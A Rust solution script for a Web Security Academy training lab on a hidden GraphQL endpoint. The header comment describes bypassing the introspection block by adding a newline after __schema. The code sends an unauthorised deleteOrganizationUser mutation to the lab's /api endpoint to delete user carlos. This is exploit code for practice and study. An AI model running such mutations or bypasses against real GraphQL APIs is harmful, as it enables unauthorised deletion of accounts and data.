/***************************************************************
*
* Lab: Finding a hidden GraphQL endpoint
*
* Hack Steps:
*      1. Find the hidden endpoint by trying multiple paths
*      2. Bypassing the introspection defenses by appending 
*         `__schema` with a new line before `{`
*      3. Analyze the introspection result
*      4. Delete carlos using the appropriate mutation
*
****************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a8a006f0367820d81cf703c0063007d.web-security-academy.net";

fn main() {
    print!("❯❯ Deleting carlos.. ");
    flush_terminal();

    let mutation = r###"mutation deleteOrganizationUser {
                            deleteOrganizationUser(input: { id: 3 }) {
                                user { 
                                    id
                                    username
                                }
                            }
                        }"###;
    delete_calros(mutation);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn delete_calros(mutation: &str) {
    let client = build_web_client();
    client
        .get(format!(
            "{LAB_URL}/api?query={mutation}"
        ))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to delete carlos".red()));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
